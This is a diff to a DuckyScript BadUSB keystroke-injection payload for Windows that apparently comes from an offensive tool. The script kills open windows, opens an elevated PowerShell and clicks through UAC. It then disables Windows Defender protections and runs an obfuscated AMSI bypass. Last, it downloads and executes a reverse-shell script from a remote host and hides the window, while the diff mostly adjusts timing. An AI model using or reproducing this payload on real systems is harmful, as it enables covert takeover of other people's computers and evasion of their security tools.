@@ -4,47 +4,53 @@ REM User needs administrator privs
 REM Stealth Method
 REM Refer to readme for attack machine setup
 REM Dont forget to change payload and IP/PORT
+REM Ensure Caps Lock is off
 
 REM Payload Start 
 DELAY 3000
 REM Short 3 second delay for bad-usb to setup
 GUI r
 REM Shortcut to open windows run search bar
-DELAY 300
+DELAY 800
 STRING cmd 
+ENTER
 REM Open CMD
-DELAY 400
-ENTER
+DELAY 1000
 STRING powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
-REM Kill all open processes on the machine. Note: Doesnt kill cmd window
 ENTER
+REM Kill all open processes on the machine. Note: Doesnt kill cmd window
 STRING exit 
 ENTER
 GUI r
+DELAY 1000
 STRING powershell Start-Process powershell -Verb runAs
 REM Run powershell as Administrator
-DELAY 100
+DELAY 500
 ENTER
-DELAY 1000
+DELAY 800
 ALT TAB
 REM Select UAC window once it pops up
-DELAY 500
+DELAY 800
 ALT y
 REM Bypass UAC window
 DELAY 400
 STRING Set-MpPreference -DisableIOAVProtection $true
 ENTER
+DELAY 500
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 REM Disable Windows Defender
 ENTER
 DELAY 300
 STRING [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 REM Bypass AMSI
-DELAY 300
+DELAY 500
 Enter
-STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://0.0.0.0/payload.ps1')
+STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/meterman-64.ps1')
 REM Download, execute powershell reverseshell payload, and store in $Process
+DELAY 500
 ENTER
+DELAY 500
 STRING powershell -windowstyle hidden $Process 
 REM Close Powershell window, keeping process open in the background
 ENTER
+REM End Payload 
